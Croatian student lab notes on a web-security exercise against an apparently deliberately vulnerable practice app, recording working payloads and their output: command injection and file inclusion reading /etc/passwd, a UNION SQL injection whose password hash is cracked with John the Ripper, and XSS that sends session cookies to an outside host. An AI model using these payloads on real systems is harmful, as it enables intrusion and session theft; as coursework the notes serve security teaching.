202206241432
Tags: 
# SRS 3 lab
## Command injectoin
- naredba koristena: `1 | cat /etc/passwd`
- ispis: 
```bash
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/bin/false
    mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
```

## SQL injection
- Umetnuta naredba: 
- komanda, **obavezno** je da ne ide znak `'` na kraju
```sql
sth' OR '1'='1' UNION SELECT last_name, password from users where last_name='Picasso
```
- mogao se bilokoji stupac koristiti umjesto last_name u drugoj tablici, mora samo druga tablica imati dva atributa
- posto ujedinjujemo vec sa tablicom koja ima dva stupca
    1. Dobijemo hash 0d107d09f5bbe40cade3de5c71e9e9b7
    2. `echo "0d107d09f5bbe40cade3de5c71e9e9b7" > hashes.txt`
    3. `cd ~srs/srs-lab/Lab3`
    4. `john/run/john --format=raw-md5 ~/hashes.txt`
    5. **FINALNA SIFRA**: `letmein`

## XSS
1. promjeni u HTML-u maxlenght na npr. 2000
2. upisati naredbu <script>alert(document.cookie </script> za ispisati sve korisnicke kolacice
	- `PHPSESSID=nt10dcgbutrkl5h4javjcbe012`
1. kako poslati na remove server
	1. isti postupak oko maxlenghta
	2. upisati naredbu 
	```html
<script>
		document.write('<img src="http://public.tel.fer.hr/srs?cookie=' + document.cookie + '" />')
</script>
	```
	
1. za reflected sam upisao identicnu stvar kao u koraku 2. u input field
	1. konacni url: http://172.17.0.2/vulnerabilities/xss_r/?name=%3Cscript%3E+%09%09document.write%28%27%3Cimg+src%3D%22http%3A%2F%2Fpublic.tel.fer.hr%2Fsrs%3Fcookie%3D%27+%2B+document.cookie+%2B+%27%22+%2F%3E%27%29+%09%3C%2Fscript%3E#

## File inclusion
1. promjeniti url u http://172.17.0.2/vulnerabilities/fi/?page=/etc/passwd 
2. ovo je moguće izvesti jer prvo server dohvati navedenu datoteku sa server preko url-a pomoću GET-a i onda ju ispiše na ekran
3. kako zaštiti
	- Treba validirati input od korisnika i nikad direktno koristiti varijable koje korisnik može promjeniti
	- najjednostavnije rješenje da je 'hardkodiramo' sve datoteke koje ćemo koristiti u samu stranicu.
---
# References
- [[srs_lv_3[1].pdf]]